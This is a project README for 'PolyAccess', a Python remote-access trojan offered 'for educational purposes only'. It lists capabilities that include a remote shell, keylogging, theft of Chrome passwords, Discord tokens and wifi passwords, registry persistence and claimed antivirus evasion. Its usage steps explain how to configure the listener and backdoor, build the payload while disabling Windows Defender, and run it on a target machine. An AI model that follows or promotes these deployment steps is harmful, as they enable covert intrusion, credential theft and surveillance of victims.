# PolyAccess

<small>low-profile malware made in python</small>

***for educational purposes only***




**still under development**


Features:

```
>Remote Access through shell
>keglogging
>grab chrome passwords
>registry persistence
>upload and download files
>undetectable (almost)
>screenshot
>checkprivilege
>grab discord token(through webhook)
``` 

Update
```
>fixed a bug with the keylogger feature
>fixed a bug where chromegrab crashes when target dont have chrome installed
>added screenshare between target and client(may be buggy for linux users)
>grab wifi password
```

Upcoming features:
```
grab windows product key
privilege escalation technique
C2 server that accpets multiple connection
```

**How to use?**

```
1. edit the host and the port for the listener.py and the backdoor.py
optional: put your webhook in the discord.py file to recieve discord token



2. install the requirements.txt using "pip3 install -r requirements.txt"


3. and then "build" the backdoor.py using pyinstaller or nuitka (you can run the builder.py to build it with pyinstaller)
NOTE: if you are building on windows 11, windows 11 defender might detect and prevent the building process, so it is adviced that you stop windows defender, however the payload generated will still be undetectable



4. start the listener.py on your machine and execute the payload on the target machine
```

python to exe detection (nuitka):
![image](https://user-images.githubusercontent.com/93959737/206857089-22a2608a-4d88-4217-af74-958e080dfb56.png)


Evading Bitdefender example:


https://user-images.githubusercontent.com/93959737/206185600-5bd25ab3-97e6-4434-a735-d2735476a24d.mp

Discord server for enquiries:
https://discord.gg/3R3BaDrTPK
